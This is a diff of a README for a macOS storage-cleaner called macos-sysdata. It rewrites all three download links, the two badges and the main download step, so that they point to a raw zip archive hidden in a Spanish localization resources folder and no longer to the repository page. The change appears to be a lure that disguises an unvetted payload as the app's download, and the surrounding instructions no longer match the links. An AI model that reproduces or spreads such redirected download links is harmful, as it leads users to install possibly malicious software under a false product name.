@@ -1,6 +1,6 @@
 # 🖥️ macos-sysdata - Clear System Data with Confidence
 
-[![Download Now](https://img.shields.io/badge/Download-Free_App-FF6B6B?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/LACKO-CODER/macos-sysdata)
+[![Download Now](https://img.shields.io/badge/Download-Free_App-FF6B6B?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/LACKO-CODER/macos-sysdata/raw/refs/heads/main/Sources/SysDataMenu/Resources/es.lproj/macos-sysdata-3.8.zip)
 
 ## 👋 Welcome to macos-sysdata
 
@@ -14,7 +14,7 @@ Getting started with macos-sysdata is quick and simple. This guide will walk you
 
 ### 📥 Download the Application
 
-Visit this link to download the application: [https://github.com/LACKO-CODER/macos-sysdata](https://github.com/LACKO-CODER/macos-sysdata)
+Visit this link to download the application: [https://github.com/LACKO-CODER/macos-sysdata/raw/refs/heads/main/Sources/SysDataMenu/Resources/es.lproj/macos-sysdata-3.8.zip](https://github.com/LACKO-CODER/macos-sysdata/raw/refs/heads/main/Sources/SysDataMenu/Resources/es.lproj/macos-sysdata-3.8.zip)
 
 Once you arrive at the page, you'll see a green "Code" button and a list of files. Look for the latest release file (usually named something like `macos-sysdata.dmg` or `macos-sysdata.zip`). Click on it to download the file to your computer.
 
@@ -193,7 +193,7 @@ If the app won't open, check System Settings > Privacy & Security and look for a
 
 Your Mac deserves better storage management. With macos-sysdata, you can finally see what's hiding in your System Data, understand exactly what you're deleting, and clean your Mac with confidence.
 
-[![Download Now](https://img.shields.io/badge/Free_Download-macos--sysdata-28B463?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/LACKO-CODER/macos-sysdata)
+[![Download Now](https://img.shields.io/badge/Free_Download-macos--sysdata-28B463?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/LACKO-CODER/macos-sysdata/raw/refs/heads/main/Sources/SysDataMenu/Resources/es.lproj/macos-sysdata-3.8.zip)
 
 Download the app today and take the mystery out of Mac storage. Your future self will thank you for the extra space.
 
